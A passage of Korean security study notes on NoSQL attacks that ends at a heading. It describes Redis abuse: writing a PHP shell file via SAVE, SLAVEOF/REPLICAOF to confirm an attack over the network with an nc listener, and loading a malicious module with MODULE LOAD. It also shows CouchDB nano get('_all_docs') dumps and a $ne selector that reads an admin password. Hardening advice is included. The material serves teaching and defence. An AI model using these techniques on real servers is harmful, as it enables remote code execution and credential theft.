                + 파일 저장 경로(```dir```)를 ```/tmp```로, 파일 이름(```dbfilename```)을 ```redis.php```로 지정한 다음 셸을 실행하는 PHP 코드를 작성하고 이를 저장함(```SAVE```) <br/> &nbsp;&nbsp; → 성공적으로 실행되면 redis.php가 /tmp에 생성되고 공격자는 이를 통해서 PHP와 연계하여 공격을 수행할 수 있음
    - **```SLAVEOF```/```REPLICAOF```**: 마스터 노드를 복제하기 위해 사용하는 명령어
        | commands | syntax | description |
        |:---:|----|------|
        | SLAVEOF(deprecated) [🔗](https://redis.io/commands/slaveof/) <br/> REPLICAOF [🔗](https://redis.io/commands/replicaof/) | ```SLAVEOF host port``` <br/> ```REPLICAOF host port``` | 현재 서버(노드)를 지정된 호스트 및 포트에서 수신하는 다른 서버(마스터 노드)의 <br/> 복제본으로 만듦 <br/> &nbsp;&nbsp; - 이미 복제되어 있을 경우에는 이전 서버에 대한 복제를 중지하고 저장한 <br/> &nbsp;&nbsp;&nbsp;&nbsp;데이터를 버린 후 새 서버에 대한 동기화를 시작함 |
        | | ```SLAVEOF NO ONE``` <br/> ```REPLICAOF NO ONE``` | 복제를 중지하고 현재 Redis 서버(노드)를 마스터 서버로 전환함 <br/> (복제한 데이터를 버리지는 않음) |
        + 현재 명령어를 실행하는 노드의 마스터 노드로 지정한 다른 Redis 노드는 연결을 맺은 후 마스터 노드의 데이터를 복제하고 저장함
            - Redis 5.0부터는 ```SLAVEOF``` 명령어 대신 ```REPLICAOF``` 명령어를 사용함 <br/> &nbsp;&nbsp; *→ 이전 버전과의 호환성을 위해 여전히 ```SLAVEOF``` 명령어는 동작하지만, ```REPLICAOF``` 명령어의 사용을 권장함*
        + ⚠️ 명령어 실행 시 마스터 노드에 연결을 맺는 과정이 포함됨 <br/> &nbsp;&nbsp; → 이때 발생하는 네트워크 트래픽을 통해 Redis 공격의 성공 여부를 원격으로 확인할 수 있음
            - 성공 여부를 확인하기 위해서는 포트를 바인딩하는 서버에서 노드의 상태를 확인하기 위한 데이터를 수신했는지를 확인해야 함
            - 공격 예시
                | | 설명 |
                |:---:|------|
                | 01 | Redis 서버에서 ```SLAVEOF 127.0.0.1 8888``` 또는 ```REPLICAOF 127.0.0.1 8888```를 실행함 <br/> &nbsp;&nbsp; *→ 127.0.0.1 호스트의 8888번 포트로 연결을 맺는 과정이 포함됨 ⇒ 네트워크 트래픽 발생* |
                | 02 | 복제한 서버(마스터 노드)에서 지정한 포트를 바인딩하는 명령어를 실행하면 노드의 상태를 확인하기 위한 데이터를 수신한 것을 <br/> 확인할 수 있음 <br/> &nbsp;&nbsp; - 🔖 ```$ nc -l 8888 -kv``` 명령어 실행 결과 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ```Listening on [0.0.0.0] (family 0, port 8888)``` <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ```Connection from [127.0.0.1] port 8888 [tcp/*] accepted (family 2, sport 52613)``` <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ```PING``` |
        + ⚠️ 마스터 노드의 데이터를 가져오기 위한 Sync(동기화) 과정의 RDB 데이터를 임의의 데이터로 조작해 원하는 파일을 업로드하는 공격 방식도 존재함
    - **```MODULE LOAD```**: 새로운 라이브러리를 추가해 사용할 수 있도록 Redis 4.0 버전부터 제공하는 명령어 [🔗](https://redis.io/commands/module-load/)
        | command | syntax | description |
        |:---:|----|------|
        | MODULE LOAD | ```MODULE LOAD path [arg [arg ...]]``` | ```path```로 지정된 동적 라이브러리에서 Redis 모듈을 로드하고 초기화함 <br/> &nbsp;&nbsp; - ```path```: 전체 파일 이름을 포함하는 라이브러리의 **절대 경로**여야 함 |
        + ⚠️ RedisModuleSDK를 기반으로 공유 라이브러리를 제작해 파일 업로드 또는 Sync(동기화) 과정을 조작하여 임의의 데이터를 업로드하는 등의 로직을 통해 해당 Reids 파일 시스템에 업로드한 후 ```MODULE LOAD```를 통해 해당 라이브러리를 로드할 수 있음
            + **라이브러리를 업로드해 공격하기 위해서는 Redis 클라이언트가 접근할 수 있는 디렉터리에 라이브러리를 업로드(생성)할 수 있어야 함**
        + 공격 예시
            - RedisModuleSDK를 기반으로 제작한 모듈 예시
                ```javascript
                // https://github.com/RedisLabs/RedisModulesSDK/blob/e756dd897fd08ac7eb8f3eb611c2cd4b591183c3/example/module.c

                // Unit test entry point for the module
                int TestModule(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
                    RedisModule_AutoMemory(ctx);

                    RMUtil_Test(testParse);
                    RMUtil_Test(testHgetSet);

                    RedisModule_ReplyWithSimpleString(ctx, "PASS");
                    return REDISMODULE_OK;
                }

                int RedisModule_OnLoad(RedisModuleCtx *ctx) {
                    ...
                    // register the unit test
                    RMUtil_RegisterWriteCmd(ctx, "example.test", TestModule);

                    return REDISMOUDLE_OK;
                }
                ```
                + 이와 같이 제작된 Redis Module를 컴파일한 후 Redis가 접근할 수 있는 디렉터리에 모듈이 존재할 경우 Redis 클라이언트에서 ```MODULE LOAD```를 이용해 모듈 코드를 실행할 수 있음
            - ```MODULE LOAD``` 명령어를 이용해 Redis 클라이언트에서 라이브러리를 로드함
                ```
                $ redis-cli
                127.0.0.1:6379> module load /var/lib/redis/module.so
                OK
                127.0.0.1:6379> module list
                1) 1) "name"
                   2) "example"
                   3) "var"
                   4) (integer) 1
                127.0.0.1:6379> EXAMPLE.TEST
                PASS
                ```
                + ⚠️ Redis Module에 ```system``` 함수와 같이 **OS 명령어를 실행하는 함수** 또는 **원하는 파일 시스템에 접근할 수 있는 함수** 등을 포함시켜 공격에 사용할 수 있음

<br/><br/>

### Redis 주의사항: Redis를 통해 서비스 사용 시 주의해야 할 사항들
* 인증 체계
    - Redis는 기본 설정 상 **인증 과정이 포함되어 있지 않은** DBMS임 <br/> &nbsp;&nbsp; → ⚠️ 공격자는 Redis 서버에 접근이 가능한 경우 원하는 명령어를 통해 Exploit Tech의 공격들을 수행하는 데 어려움이 없음
    - 해결방법
        + **인증 과정을 추가**하는 방법
            - Redis에서 DBMS의 설정을 관리하는 **/etc/redis/redis.conf** 파일의 ```requirepass```를 이용해 패스워드를 지정할 수 있음 <br/> &nbsp;&nbsp; → 설정 이후 Redis 사용 시 ```AUTH``` 명령어를 통해 인증 과정을 거쳐야만 Redis 명령어를 사용할 수 있음
                | | 설명 |
                |:---:|------|
                | 01 | **/etc/redis/redis.conf** 파일에 ```requirepass password``` 형식으로 패스워드를 지정한 후 저장함 |
                | 02 | 설정 파일을 적용하기 위해 Redis 서버를 재시작함 (```sudo service redis-server restart```) |
                | 03 | 이후 클라이언트에서는 ```AUTH``` 명령어를 입력하여 인증 과정을 거쳐야만 명령어 실행이 가능함 <br/> &nbsp;&nbsp; - ```AUTH``` 명령어로 인증 과정을 거치기 전의 명령어들은 에러(NOAUTH Authentication require)를 발생시킴 |
        + Redis 6.0 버전 이후부터 추가된 **Multi Users와 ACL(Access Control List)를 통해 접근 제어를 설정할 수 있는 기능**을 이용하는 방법
            - 다양한 사용자에 대한 인증을 수행할 수 있고, 권한과 명령어 등을 분리할 수 있음

<br/>

* bind
    - Redis는 3.2.0 버전부터 **```Bind 127.0.0.1```로 기본 설정**되어 서비스됨
        + 구조적 또는 기능 상의 구현을 위해서 ```0.0.0.0``` 등 위험한 Bind 범위를 지정하여 서비스되는 경우가 있음 <br/> &nbsp;&nbsp; → 공격자에게 해당 서비스가 노출되어 직접 접근이 될 경우 Exploit Tech의 공격 방법 등을 통해 서비스에 위협이 발생할 수 있음
    - 설정 파일에서 바인딩 주소를 설정하는 방법
        | 방법 | 설명 |
        |:---:|------|
        | 기본 설정 | ```BIND 127.0.0.1``` → 안전한 환경을 구성하기 위해 기본적으로 127.0.0.1로 설정되어 있음 |
        | 위험한 설정 | ```#BIND 127.0.0.1``` → 기본 설정을 주석 처리(```#```)하면 모든 IP의 접속을 허용하게 됨 <br/> ```BIND 0.0.0.0``` → 모든 IP의 접속을 허용함 <br/> &nbsp;&nbsp; ***⇒ ⚠️ 인증 과정이 미흡하거나 알려진 취약점이 존재하는 경우 시스템이 취약해질 수 있음*** |
        | 권고 설정 | ```BIND 192.168.1.2 127.0.0.1``` <br/> → 기능적으로 허용해야 하는 경우에 IP 지정을 통해 해당 IP만 허용하며, 허용하는 IP에 대한 주기적인 확인이 필요함 |

<br/>

* 중복 키 사용(Same key, prefix 없는 key 사용)
    - Redis는 기본 설정 상 **Key-Value 쌍으로 데이터를 저장**하는 구조임
        + RDBMS의 Schema/Table, MongoDB의 Collection과 같이 시스템적으로 특정한 영역으로 구분되어 저장하지 않음
    - ⚠️ 중복 키 문제가 발생하는 상황 (서로 다른 용도로 사용하는 키 명칭이 중복되는 경우)
        + Cache를 Redis에서 구현할 때 Cache Type별 Redis 서버를 분리하지 않을 때 Key 값이 중복되어 사용될 경우 문제가 발생함
            - Cache Type에는 유저 정보 캐시, 인증 관련 캐시, 임시 데이터 등이 포함됨
        + Key를 구분자 없이 사용하고, 사용자의 입력에 의해 Key가 결졍되는 경우 문제가 발생함 <br/> &nbsp;&nbsp; *→ 사용자가 임의로 다른 로직의 키를 생성시켜 어플리케이션 로직에 혼선을 발생시킬 수 있음*
            - 문제 발생 상황 예시 1: Redis에서 사용자의 메일 인증번호와 인증 횟수를 확인하기 위한 정보를 저장하는 어플리케이션에서 Prefix 없는 key를 사용하는 경우
                ```
                SET key value
                SET {email} {random number} # 사용자 메일 인증 번호 저장
                SET {email}_count 0 # 사용자 메일 인증 횟수 저장
                ```
                + 사용자 메일 인증 번호와 인증 횟수를 저장할 때 이용자의 입력값(```{email}```)를 key 명칭으로 하여 값을 저장함
                + 공격 예시
                    - ```user1@sample.com_count``` 매일 주소로 인증 번호를 요청하면 Redis의 데이터는 아래와 같이 저장됨
                        ```
                        user1@sample.com_count = {random number}
                        user1@sample.com_count_count = 0
                        ```
                    - ```user1@sample.com``` 메일 주소로 인증 번호를 요청하면 Redis의 데이터는 아래와 같이 처리됨
                        ```
                        user1@sample.com_count = 0
                        user1@sample.com_count_count = 0
                        user1@sample.com = {random number}
                        ```
                        + 기존에 사용되던 키 ```user1@sample.com_count```가 새로 저장되는 키와 중복되어 이전에 저장된 인증 번호가 아닌 추측 가능한 숫자(```0```)으로 변경됨 → 어플리케이션의 인증 과정을 우회할 수 있음
                + ⚠️ *prefix가 지정되지 않은 키를 사용하기 때문에 유저가 임의로 키를 지정할 수 있으면 해당 키의 데이터가 어떤 값이 오게 될 지 예측할 수 있음*
            - 문제 상황 발생 예시 2: 각 데이터 별로 서로 다른 구분자를 사용하여 구현하는 경우
                ```
                Cache_A = f'CACHE_A:{input}'
                Cache_B = f'{input}.CACHE_B'
                ```
                + ```CACHE_A:tet.CACHE_B```와 같은 값이 들어오면 문제가 발생함

<br/><br/><br/>

## CouchDB
* Background: CouchDB
    - **key-value** 쌍인 구조로 **JSON objects 형태인 document**를 저장하는 웹 기반의 DBMS
        + HTTP 기반의 서버로 **REST API 형식**으로 HTTP Method(```GET```, ```POST```, ```PUT```, ```DELETE``` 등)을 기반해 요청을 처리함 <br/> &nbsp;&nbsp; ↳ ```curl```과 같은 HTTP Client로 접근할 수 있음
    - CouchDB의 특수 구성요소
        + 일반적으로 ```_```(밑줄) 문자로 시작하는 URL 구성요소/JSON 필드는 특수 구성 요소를 나타냄
        + 특수 구성요소의 종류 [🔗](https://docs.couchdb.org/en/latest/api/index.html)
            - Server [🔗](https://docs.couchdb.org/en/latest/api/server/index.html)
                | 요소 | 설명 |
                |:---:|------|
                | ```/``` | 인스턴스 루트에 접근하여 인스턴스에 대한 메타 정보를 반환함 <br/> &nbsp;&nbsp; - Response: 서버에 대한 정보를 포함하는 JSON structure |
                | ```/_all_dbs``` | 인스턴스의 모든 데이터베이스 목록을 반환함 |
                | ```/_utils``` | 관리자 페이지(built-in Fauxton administration interface)로 이동함 |
            - Database [🔗](https://docs.couchdb.org/en/latest/api/database/index.html)
                | 요소 | 설명 |
                |:---:|------|
                | ```/{db}``` | 지정된 데이터베이스에 대한 정보를 반환함 |
                | ```/{db}/_all_docs``` | 지정된 데이터베이스에 포함된 모든 도큐먼트를 반환함 |
                | ```/{db}/_find``` | 지정된 데이터베이스에서 JSON 쿼리에 해당하는 모든 도큐먼트를 반환함 |
            - JSON 내부의 특수 필드 → ```_```(밑줄)로 시작하는 필드 중 속성 값으로 사용되는 필드
                | 필드 | 설명 |
                |:---:|------|
                | ```_id``` | 도큐먼트의 아이디(id) <br/> &nbsp;&nbsp; - 처음에 설정하지 않으면 랜던함 값으로 설정되고 Primary Key 역할을 함 |
                | ```_rev``` | 문서의 버전 정보 |
    - ⚠️ **주로 사용자 입력 데이터에 대한 타입 검증이 충분하지 않거나 특수 구성요소로 사용되어지는 값들에 대한 접근으로 인해 취약점이 발생함**

<br/><br/>

### Bug Case: nano 패키지
* Background: **nano**
    - Apache에서 개발한, NodeJS에서 CouchDB를 사용할 때 주로 사용하는 패키지 [🔗](https://github.com/apache/couchdb-nano)
    - ```get``` 함수를 사용해 ```_id``` 정보를 기반으로 데이터를 조회하거나 ```find``` 함수를 사용해 쿼리 기반으로 데이터를 가져올 수 있음
        | 사용 함수 | 설명 |
        |:---:|------|
        | ```get``` | 특수 구성 요소인 ```_all_docs```, ```_db``` 등에 접근하여 데이터베이스의 정보를 획득하는 등 의도하지 않은 행위를 수행할 수 있음 |
        | ```find``` | 연산자와 같이 객체(오브젝트) 타입의 값을 입력해 의도하지 않은 행위를 수행할 수 있음 |
        + nano 패캐지의 ```get``` 험수의 구현
            ```javascript
            // https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 680-688
            function getDoc (docName, qs0, callback0) {
                const { opts, callback } = getCallback(qs0, callback0);

                if (missing(docName)) {
                    return callbackOrRejectError(callback);
                }

                // https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 257-461 (relax 함수) 참고
                return relax({ db: dbName, doc: docName, qs: opts }, callback);
            }
            ```
            - ```relax``` 함수를 호출하여 처리되는 과정
                | | 설명 |
                |:---:|------|
                | 01 | init(초기화) 과정에서 등록된 URL(```cfg.url```)의 뒤에 db 이름을 합침 <br/> (```req.uri = urlResolveFix(req.uri, encodeURIComponent(opts.db));```) |
                | 02 | 그 뒤에 입력받은 ```doc```를 추가함 (```req.uri += '/' + encodeURIComponent(opts.doc);```) |
                | 03 | 만들어진 URL로 HTTP GET 메소드를 이용해 요청을 보냄 |
            - ⚠️ **전달된 인자에 대해 특수 구성요소의 포함 여부를 검사하지 않음**
        + nano 패키지의 ```find``` 함수의 구현
            ```javascript
            // https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 1025-1036
            function find (query, callback) {
                if (missing(query) || typeof query !== 'object') {
                    return callbackOrRejectError(callback);
                }

                 return relax({
                    db: dbName,
                    path: '_find',
                    method: 'POST',
                    body: query
                 }, callback);
            }
            ```
            - if문의 조건식을 이용해 전달된 쿼리가 NUL인지, 객체 타입이 아닌지를 검사하여 둘 중 하나라도 참이 되면 에러를 발생시킴 <br/> &nbsp;&nbsp; *→ ⚠️ **객체 형태의 데이터를 전달할 수 있음**을 알 수 있음*

<br/>

* nano 패키지의 ```get``` 함수를 이용한 공격
    - ⚠️ ```get``` 함수의 내부에서 특수 구성요소가 필터링 되어있지 않음 → 사용자의 입력을 ```get```으로 사용할 경우 의도하지 않은 행위를 수행할 수 있음
    - 예시: 정상적인 접근과 ```/{db}/_all_docs``` 접근
        + 정상적인 접근
            ```javascript
            require('nano')('http://{username}:{password}@localhost:5984').use('users').get('guest', function(err, result){ console.log('err: ', err, ', result: ', result); });
            /* 결과
                err: null, result: { _id: 'guest', _rev: '1-22a458e50cf189b17d50eeb295231896', upw: 'guest' }
            */
            ```
            - 이용자가 요청한 users 데이터베이스의 guest 계정에 대한 정보를 얻을 수 있음 (```get``` 함수의 첫 번째 인자로 ```'guest'```를 입력함)
        + ```/{db}/_all_docs``` 접근
            ```javascript
            require('nano')('http://{username}:{password}@localhost:5984').use('users').get('_all_docs', function(err, result){ console.log('err: ', err, ', result: ', result); });
            /* 결과
                err: null, result: { total_rows: 3, offset: 0,
                rows:
                    [ { id: '0c1371b65480420e678d00c2770003f3',
                        key: '0c1371b65480420e678d00c2770003f3',
                        value: [Object] },
                        { id: '0c1371b65480420e678d00c277001712',
                        key: '0c1371b65480420e678d00c277001712',
                        value: [Object] },
                        { id: 'guest', key: 'guest', value: [Object] } ]
                }
            */
            ```
            - users 데이터베이스의 ```_all_docs```에 접근해 저장된 데이터베이스에 대한 모든 도큐먼트를 얻을 수 있음 (```get``` 함수의 첫 번째 인자로 ```_all_docs```를 입력함)

<br/>

* nano 패키지의 ```find``` 함수를 이용한 공격
    - ⚠️ ```find``` 함수의 인자로 들어가는 사용자 입력의 타입이 문자열이 아닌 오브젝트 타입인 경우 ```operator```(연산자)를 사용해 의도하지 않은 행위를 수행할 수 있음
    - 예시: 정상적인 데이터 조회와 악의적인 데이터 조회
        + 정상적인 쿼리 요청
            ```javascript
            require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'guest', 'upw': 'guest'}}, function(err, result){ console.log('err: ', err, ', result: ', result); });
            /* 결과
            undefined
            err:  null ,result:  { docs:
                [ { _id: 'guest',
                    _rev: '1-22a458e50cf189b17d50eeb295231896',
                    upw: 'guest' } ],
                bookmark: 'g1AAAAA6eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzppemFpeAJDlgkgjhLADZAxEP',
                warning: 'No matching index found, create an index to optimize query time.' 
            }
            */
            ```
            + 이용자가 요청한 users 데이터베이스의 guest 계정의 데이터를 조회함 (```find``` 함수의 ```selector```로 ```_id```와 ```upw```에 ```'guest'```를 입력함)
        + ```selector```를 포함한 공격 쿼리 전송
            ```javascript
            require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'admin', 'upw': {'$ne': ''}}}, function(err, result){ console.log('err; ', err, ', result: ', result); });
            /* 결과
            undefined
                err:  null ,result:  { docs:
                    [ { _id: 'admin',
                        _rev: '2-142ddb6e06fd298e86fa54f9b3b9d7f2',
                        upw: 'secretpassword' } ],
                bookmark: 'g1AAAAA6eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzJqbkZuaBJDlgkgjhLADVNBDR',
                warning: 'No matching index found, create an index to optimize query time.' 
            }
            */
            ```
            + 공격자가 요청한 users 데이터베이스의 admin 계정의 데이터를 조회할 때 ```upw```의 값에 상관없이 admin 계정의 데이터를 조회함 (```find``` 함수의 ```selector```로 ```upw```에 연산자 ```$ne```를 사용해 ```''```이 아니면 데이터를 조회하도록 만들고 있음) <br/> &nbsp;&nbsp; *→ ⚠️ not equal(```$ne```) 연산자를 사용하여 upw를 모르는 상황에서도 원하는 데이터를 조회할 수 있음*

<br/><br/>

### CouchDB 특수 구성요소를 이용한 공격
